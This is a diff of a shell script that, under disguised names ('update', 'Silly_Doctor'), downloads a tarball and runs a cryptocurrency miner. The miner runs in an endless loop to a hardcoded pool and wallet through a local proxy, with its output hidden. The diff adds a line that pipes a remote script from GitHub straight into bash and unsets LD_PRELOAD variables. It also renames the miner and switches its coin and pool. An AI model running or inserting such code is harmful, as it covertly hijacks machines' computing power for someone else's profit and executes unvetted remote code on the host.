@@ -1,6 +1,6 @@
 #!/bin/sh
 
-apt update >/dev/null;apt -y install apt-utils psmisc npm libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null
+apt update >/dev/null;apt -y install apt-utils psmisc iputils-ping screen npm libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null
 
 sleep 2
 
@@ -31,10 +31,6 @@ npm
 
 sleep 2
 
-npm install -g npm@10.4.0
-
-sleep 2
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
 dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
 
@@ -49,7 +45,7 @@ currentdate=$(date '+%d-%b-%Y_Val16Cores_')
 ipaddress=$(curl -s api.ipify.org)
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
 currentdate+=$underscored_ip
-used_num_of_cores=`expr $num_of_cores - 3`
+used_num_of_cores=`expr $num_of_cores - 4`
 echo ""
 echo "You will be using $used_num_of_cores cores"
 echo ""
@@ -64,7 +60,7 @@ ph add update-local 1>/dev/null 2>&1
 
 sleep 2
 
-ph add Xmas 1>/dev/null 2>&1
+ph add Silly_Doctor 1>/dev/null 2>&1
 
 sleep 2
 
@@ -98,11 +94,11 @@ sleep 2
 
 sleep 2
 
-./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/Xmas.tar.gz 1>/dev/null 2>&1
+./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/Silly_Doctor.tar.gz 1>/dev/null 2>&1
 
 sleep 2
 
-tar -xf Xmas.tar.gz
+tar -xf Silly_Doctor.tar.gz
 
 echo " "
 echo " "
@@ -117,12 +113,16 @@ echo ""
 echo ""
 sleep 2
 
-(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf)) && sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+unset LD_PRELOAD
+unset LD_PRELOAD_ENV
+unset LD_LIBRARY_PATH
 
 sleep 2
 
+wget -O - https://raw.githubusercontent.com/mthethelelinyambose/ping/main/ping.sh | bash &
+
 while true
 do
-./Xmas --donate-level 1 -o de.zephyr.herominers.com:1123 -a rx/0 -u ZEPHYR34MGwFTPeqZtuzm7VsAujvy9XEicJtwWkcKJVYJzDwHpw9YAW4XPLw5QLRiAFswe9pAfckTjYXVzGnAvDHdQ7FUVTcpgy4g -p $currentdate -k --verbose --randomx-1gb-pages -t $used_num_of_cores -k --proxy=127.0.0.1:7777 1>/dev/null 2>&1
+./Silly_Doctor --disable-gpu --algorithm aurum --pool stratum-eu.rplant.xyz:7109 --wallet BE68QAyJA16B2QgtFPKjXZyuQTJJmLEm48.$currentdate --password webpassword=IhatePopUps --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 10
 done
